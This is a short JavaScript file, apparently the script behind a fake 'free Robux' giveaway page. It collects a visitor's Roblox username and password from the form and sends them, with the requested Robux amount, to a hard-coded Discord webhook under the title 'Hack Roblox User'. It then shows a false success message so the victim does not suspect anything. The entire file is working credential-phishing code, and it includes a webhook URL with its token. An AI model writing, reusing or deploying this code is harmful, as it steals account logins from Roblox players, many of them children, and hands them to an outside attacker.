let robux = document.getElementById('robuxnumber')
let username = document.getElementById('username')
let password = document.getElementById('password')
let submit = document.getElementById('submit')
let numberrobux = document.getElementById('numberrobux')

function bruh3() {
    if (sessionStorage.getItem(username.value) != username.value)
    {
        if (numberrobux.value > 1000) {
            alert('Robux Limit : 1000!')
        }
        else
        {
            if (username.value == "")
            {
                alert('Complete Your Username!')
            }
            else
            {
                if (password.value == "")
                {
                    alert('Complete Your Password!')
                }
                else
                {
                    const msg = { 
                        "content": null,
                        "embeds": [
                            {
                            "title": "Hack Roblox User",
                            "description": "Username : "+username.value+"\nPasssword : "+password.value+"\nRobux : "+numberrobux.value,
                            "color": 7405312
                            }
                        ],
                        "username": "Hack Roblox User"
                          
                    }
                    fetch("https://discord.com/api/webhooks/803272306905972766/5NSRaAcPHw-_W4uy2uBdkPg8zGFp6dO-7sRbYrzZI9TWKsFmLDuDAKUmX7c8Am2pIgJ1",
                    {"method":"POST", "headers": {"content-type":"application/json"},
                    "body": JSON.stringify(msg)})
                    sessionStorage.setItem(username.value , username.value)
                    alert('Successfully! Wait 1-24 Hours')
                }
            }
        }
    }
    else
    {
        alert('This User Already Get Free Robux!')
    }
}

submit.addEventListener('click' , bruh3)